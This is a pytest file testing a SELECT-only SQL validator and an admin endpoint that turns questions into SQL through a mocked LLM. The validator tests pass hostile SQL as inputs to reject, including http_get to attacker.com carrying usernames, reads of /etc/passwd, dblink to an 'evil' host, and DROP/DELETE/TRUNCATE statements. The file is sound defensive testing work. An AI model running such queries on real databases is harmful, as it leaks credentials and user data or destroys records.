"""SQL validator unit tests + endpoint integration tests (with mocked LLM)."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from unittest.mock import patch

import pytest

# ---- Unit tests for validator ----
from src.usage_ask import validate_select_only


def test_validator_accepts_simple_select():
    assert validate_select_only("SELECT * FROM usage_events LIMIT 10").startswith("SELECT")


def test_validator_accepts_with_cte():
    sql = "WITH x AS (SELECT 1 AS a) SELECT * FROM x"
    assert validate_select_only(sql).startswith("WITH")


def test_validator_strips_trailing_semicolon():
    assert validate_select_only("SELECT 1;") == "SELECT 1"


def test_validator_rejects_multiple_statements():
    with pytest.raises(ValueError, match="multiple statements"):
        validate_select_only("SELECT 1; DROP TABLE usage_events")


def test_validator_rejects_insert():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("INSERT INTO usage_events VALUES (...)")


def test_validator_rejects_update():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("UPDATE usage_events SET tool_name='x'")


def test_validator_rejects_delete():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("DELETE FROM usage_events")


def test_validator_rejects_drop_table():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("DROP TABLE usage_events")


def test_validator_rejects_attach():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("ATTACH '/etc/passwd' AS leaks")


def test_validator_rejects_empty():
    with pytest.raises(ValueError, match="empty"):
        validate_select_only("")


def test_validator_rejects_non_select():
    # PRAGMA is in the forbidden list, so the error names the keyword.
    with pytest.raises(ValueError, match="forbidden|only SELECT"):
        validate_select_only("PRAGMA database_list")


def test_validator_rejects_truncate():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("TRUNCATE TABLE usage_events")


def test_validator_rejects_create():
    with pytest.raises(ValueError, match="forbidden"):
        validate_select_only("CREATE TABLE evil AS SELECT 1")


def test_validator_rejects_read_csv():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT * FROM read_csv('/etc/passwd')")


def test_validator_rejects_read_file():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT read_file('/data/state/system.duckdb') AS leak")


def test_validator_rejects_http_get():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT http_get('https://attacker.com/x?d=' || username) FROM usage_events")


def test_validator_rejects_parquet_scan():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT * FROM parquet_scan('/data/extracts/**')")


def test_validator_rejects_glob():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT * FROM glob('/data/**')")


def test_validator_rejects_duckdb_settings():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT * FROM duckdb_settings()")


def test_validator_accepts_column_named_read_count():
    """Don't false-positive on column names containing forbidden substrings."""
    sql = "SELECT read_count, file_path FROM usage_session_summary WHERE read_count > 0"
    assert validate_select_only(sql) == sql.strip()


# ---- PostgreSQL-specific escape hatches (Ask runs on PG after cutover) ----


def test_validator_rejects_pg_advisory_lock():
    """A syntactic SELECT must not be able to grab the migration advisory lock.

    pg_advisory_lock(636636636636) acquires the SAME session-level lock as the
    startup migration (src/db_pg.py::_PG_MIGRATE_LOCK_KEY); on a pooled
    connection it leaks and wedges the next migration.
    """
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT pg_advisory_lock(636636636636)")


def test_validator_rejects_pg_advisory_lock_variants():
    for fn in (
        "pg_try_advisory_lock",
        "pg_advisory_xact_lock",
        "pg_advisory_unlock_all",
    ):
        with pytest.raises(ValueError, match="forbidden function"):
            validate_select_only(f"SELECT {fn}(1)")


def test_validator_rejects_pg_read_file():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT pg_read_file('/etc/passwd')")


def test_validator_rejects_dblink():
    with pytest.raises(ValueError, match="forbidden function"):
        validate_select_only("SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)")


def test_validator_rejects_pg_notify_and_sequence_mutators():
    for sql in (
        "SELECT pg_notify('chan', 'msg')",
        "SELECT nextval('some_seq')",
        "SELECT setval('some_seq', 1)",
    ):
        with pytest.raises(ValueError, match="forbidden function"):
            validate_select_only(sql)


def test_validator_accepts_column_named_pg_advisory():
    """Only the function-call form is rejected — a bare identifier is fine."""
    sql = "SELECT pg_advisory FROM usage_events WHERE pg_advisory IS NOT NULL"
    assert validate_select_only(sql) == sql.strip()


# ---- Endpoint tests with mocked LLM ----


def test_ask_endpoint_returns_503_when_no_api_key(seeded_app, admin_user, monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    resp = seeded_app["client"].post(
        "/api/admin/telemetry/ask",
        json={"question": "how many events today"},
        headers=admin_user,
    )
    assert resp.status_code == 503
    assert "ANTHROPIC_API_KEY" in resp.json()["detail"]


def test_ask_endpoint_executes_valid_sql(seeded_app, admin_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    # Seed a couple events
    from src.db import close_system_db, get_system_db

    conn = get_system_db()
    conn.execute(
        """INSERT INTO usage_events
        (id, session_id, session_file, username, event_type, tool_name,
         is_error, source, occurred_at, processor_version)
        VALUES (?, 'sess-1', 'alice/x.jsonl', 'alice', 'tool_use', 'Bash',
                false, 'builtin', ?, 1)""",
        ["e1", datetime(2026, 5, 12, tzinfo=UTC)],
    )
    conn.close()
    close_system_db()

    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "SELECT COUNT(*) AS n FROM usage_events",
            "rationale": "Counts all events.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "how many events"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    body = resp.json()
    assert body["sql"] == "SELECT COUNT(*) AS n FROM usage_events"
    assert body["rows"][0]["n"] == 1
    assert body["rationale"] == "Counts all events."


def test_ask_endpoint_rejects_mutating_sql_returns_200_with_reject(seeded_app, admin_user, monkeypatch):
    """Server returns 200 + rejected field when LLM produces mutating SQL — admin still sees what was tried."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "DROP TABLE usage_events",
            "rationale": "Drops the table.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "how do I delete everything"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    body = resp.json()
    assert body["sql"] == "DROP TABLE usage_events"
    assert "forbidden" in body["rejected"].lower()
    assert body["rows"] is None


def test_ask_endpoint_writes_audit_log_on_success(seeded_app, admin_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "SELECT 1 AS x",
            "rationale": "Tautology.",
        }
        seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "test"},
            headers=admin_user,
        )
    from src.db import close_system_db, get_system_db

    conn = get_system_db()
    n = conn.execute("SELECT COUNT(*) FROM audit_log WHERE action='usage.ask'").fetchone()[0]
    row = conn.execute(
        "SELECT params FROM audit_log WHERE action='usage.ask' ORDER BY timestamp DESC LIMIT 1"
    ).fetchone()
    conn.close()
    close_system_db()
    assert n >= 1
    params = json.loads(row[0])
    assert params["question"] == "test"
    assert params["sql"] == "SELECT 1 AS x"


def test_ask_endpoint_writes_audit_log_on_rejection(seeded_app, admin_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "DELETE FROM usage_events",
            "rationale": "Deletes everything.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "delete everything"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    assert resp.json().get("rejected")

    from src.db import close_system_db, get_system_db

    conn = get_system_db()
    row = conn.execute(
        "SELECT result, params FROM audit_log WHERE action='usage.ask' ORDER BY timestamp DESC LIMIT 1"
    ).fetchone()
    conn.close()
    close_system_db()
    assert row is not None
    assert row[0] == "error.invalid_sql"
    params = json.loads(row[1])
    assert "rejected" in params


def test_ask_endpoint_admin_only(seeded_app, analyst_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    resp = seeded_app["client"].post(
        "/api/admin/telemetry/ask",
        json={"question": "anything"},
        headers=analyst_user,
    )
    assert resp.status_code in (401, 403)


def test_ask_endpoint_rejects_empty_question(seeded_app, admin_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    resp = seeded_app["client"].post(
        "/api/admin/telemetry/ask",
        json={"question": ""},
        headers=admin_user,
    )
    assert resp.status_code == 400


def test_ask_endpoint_rejects_too_long_question(seeded_app, admin_user, monkeypatch):
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    resp = seeded_app["client"].post(
        "/api/admin/telemetry/ask",
        json={"question": "x" * 1001},
        headers=admin_user,
    )
    assert resp.status_code == 400


def test_ask_endpoint_uses_postgresql_prompt_when_pg(seeded_app, admin_user, monkeypatch):
    """On a PG-backed instance the LLM must be prompted for PostgreSQL SQL.

    Pins the dialect branch introduced with the backend-routing fix: a
    regression that sent the DuckDB prompt while executing on Postgres would
    make normal Ask questions fail on dialect differences (e.g. interval
    syntax). We patch only the `use_pg` name imported into admin_usage, so the
    dialect flips to PostgreSQL while the repository factory still resolves to
    the DuckDB test backend (audit + execution stay on DuckDB). The mocked LLM
    returns benign, cross-dialect SQL so execution succeeds either way.
    """
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    monkeypatch.setattr("app.api.admin_usage.use_pg", lambda: True)
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "SELECT 1 AS x",
            "rationale": "Tautology.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "test"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    # The system prompt handed to the LLM must be the PostgreSQL flavor.
    _, kwargs = mock_cls.return_value.extract_json.call_args
    system = kwargs["system"]
    assert "PostgreSQL" in system
    assert "INTERVAL '7 days'" in system
    assert "DuckDB-flavor" not in system


def test_ask_endpoint_uses_duckdb_prompt_by_default(seeded_app, admin_user, monkeypatch):
    """Counterpart to the PG test — the default DuckDB backend gets the DuckDB prompt."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.return_value.extract_json.return_value = {
            "sql": "SELECT 1 AS x",
            "rationale": "Tautology.",
        }
        seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "test"},
            headers=admin_user,
        )
    _, kwargs = mock_cls.return_value.extract_json.call_args
    assert "DuckDB" in kwargs["system"]
    assert "PostgreSQL" not in kwargs["system"]


def test_ask_endpoint_row_cap_truncation(seeded_app, admin_user, monkeypatch):
    """LLM returns a query that produces >1000 rows; server truncates to 1000 with truncated=True."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        # Query that returns 1001 rows via generate_series
        mock_cls.return_value.extract_json.return_value = {
            "sql": "SELECT i FROM generate_series(1, 1001) AS t(i)",
            "rationale": "Returns 1001 numbers.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "give me lots of rows"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    body = resp.json()
    assert body["truncated"] is True
    assert body["row_count"] == 1000
    assert len(body["rows"]) == 1000


def test_ask_endpoint_maps_client_construction_failure_to_502(seeded_app, admin_user, monkeypatch):
    """A failure constructing the extractor is an LLM failure, not an unhandled 500.

    The SDK import is deferred to first use, so `AnthropicExtractor(...)` is
    itself a failure point — it must be raised inside the endpoint's error
    boundary like the call it precedes.
    """
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-fake")
    with patch("app.api.admin_usage.AnthropicExtractor") as mock_cls:
        mock_cls.side_effect = ModuleNotFoundError("No module named 'anthropic'")
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "how many events"},
            headers=admin_user,
        )
    assert resp.status_code == 502
    assert "LLM call failed" in resp.json()["detail"]


def test_ask_endpoint_uses_vertex_when_configured(seeded_app, admin_user, monkeypatch):
    """ai.provider: vertex — no ANTHROPIC_API_KEY needed; the endpoint builds
    a VertexExtractor instead of 503ing."""
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with (
        patch("app.api.admin_usage.vertex_config_or_none", return_value=("proj-1", "global")),
        patch("app.api.admin_usage.create_vertex_extractor") as mock_factory,
    ):
        mock_factory.return_value.extract_json.return_value = {
            "sql": "SELECT COUNT(*) AS n FROM usage_events",
            "rationale": "Counts all events.",
        }
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "how many events"},
            headers=admin_user,
        )
    assert resp.status_code == 200
    mock_factory.assert_called_once()


def test_ask_endpoint_503_mentions_vertex_option(seeded_app, admin_user, monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with patch("app.api.admin_usage.vertex_config_or_none", return_value=None):
        resp = seeded_app["client"].post(
            "/api/admin/telemetry/ask",
            json={"question": "how many events today"},
            headers=admin_user,
        )
    assert resp.status_code == 503
    assert "ai.provider: vertex" in resp.json()["detail"]
